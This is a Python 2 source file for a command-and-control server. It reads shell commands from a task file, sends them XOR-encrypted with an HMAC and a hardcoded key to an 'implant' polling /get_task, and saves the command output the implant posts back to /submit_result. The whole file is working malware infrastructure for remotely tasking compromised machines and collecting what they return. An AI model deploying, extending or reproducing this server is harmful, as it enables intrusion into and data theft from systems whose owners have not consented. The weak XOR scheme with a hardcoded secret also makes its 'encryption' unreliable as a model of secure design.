#!/usr/bin/env python2

import BaseHTTPServer
import json
import os
import base64
import hashlib
import hmac

HOST_NAME = '0.0.0.0'
PORT_NUMBER = 80

# File paths
TASK_FILE = "tasks.txt"
RESULT_FILE = "results.txt"

# Task and result storage
tasks = []
results = {}

# Shared secret key
SECRET_KEY = b'supersecretkey123'

# Encryption and decryption helpers
def xor_encrypt(data, key):
    """Encrypt/Decrypt data using XOR."""
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(data, (key * (len(data) // len(key) + 1))[:len(data)]))

def encrypt_data(data):
    """Encrypt data with XOR and append HMAC for integrity."""
    data = data.encode('utf-8')  # Ensure data is a byte string
    encrypted = xor_encrypt(data, SECRET_KEY)
    hmac_hash = hmac.new(SECRET_KEY, encrypted, hashlib.sha256).hexdigest()
    return base64.b64encode(encrypted + hmac_hash)

def decrypt_data(data):
    """Decrypt data with XOR and verify HMAC."""
    decoded = base64.b64decode(data)
    encrypted = decoded[:-64]
    received_hmac = decoded[-64:]
    expected_hmac = hmac.new(SECRET_KEY, encrypted, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(received_hmac, expected_hmac):
        raise ValueError("HMAC verification failed. Data integrity compromised.")
    decrypted = xor_encrypt(encrypted, SECRET_KEY)
    return decrypted.decode('utf-8')  # Decode byte string to unicode

def load_tasks_from_file():
    """Load tasks from the task file into the tasks queue."""
    if not os.path.exists(TASK_FILE):
        print("Task file not found. Creating an empty one...")
        open(TASK_FILE, 'w').close()

    with open(TASK_FILE, 'r') as f:
        for line_num, line in enumerate(f, 1):
            line = line.strip()
            if not line:  # Skip empty lines
                continue
            try:
                task = json.loads(line)
                if 'task_id' in task and 'command' in task:
                    tasks.append(task)
                    print("Loaded task from line {}: {}".format(line_num, task))
                else:
                    print("Invalid task format on line {}: {}".format(line_num, line))
            except ValueError:
                print("Skipping invalid JSON on line {}: {}".format(line_num, line))

def clear_task_file():
    """Clear the task file after all tasks are loaded and executed."""
    open(TASK_FILE, 'w').close()
    print("Task file cleared.")

def save_result_to_file(task_id, output):
    """Save the task output to the results file."""
    with open(RESULT_FILE, 'a') as f:
        f.write("Task ID: {}\n".format(task_id))
        f.write("Output:\n{}\n".format(output))
        f.write("-" * 40 + "\n")  # Separator for readability
    print("Result for Task ID {} written to results file.".format(task_id))

class C2ServerHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
        """Handle GET requests to send tasks to the implant."""
        if self.path == '/get_task':
            if tasks:
                task = tasks.pop(0)
                encrypted_task = encrypt_data(json.dumps(task))
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(encrypted_task)
                print("Encrypted task sent to implant: {}".format(task))

                # Clear task file if queue is empty
                if not tasks:
                    clear_task_file()
            else:
                self.send_response(204)  # No tasks available
                self.end_headers()

    def do_POST(self):
        """Handle POST requests for task results."""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        try:
            decrypted_data = json.loads(decrypt_data(post_data))
            if self.path == '/submit_result':
                # Store the result from the implant
                task_id = decrypted_data.get('task_id')
                output = decrypted_data.get('output')
                results[task_id] = output
                self.send_response(200)
                self.end_headers()
                save_result_to_file(task_id, output)  # Write output to file
            else:
                self.send_response(404)  # Not Found
                self.end_headers()
        except Exception as e:
            self.send_response(500)  # Internal Server Error
            self.end_headers()
            print("Error processing POST request: {}".format(e))

    def log_message(self, format, *args):
        """Suppress default logging for cleaner output."""
        return

if __name__ == '__main__':
    print("Loading tasks from file...")
    load_tasks_from_file()
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), C2ServerHandler)
    print("C2 server running on {}:{}".format(HOST_NAME, PORT_NUMBER))
    try:
        while True:
            httpd.handle_request()
    except KeyboardInterrupt:
        print("\nShutting down the C2 server.")
        httpd.server_close()
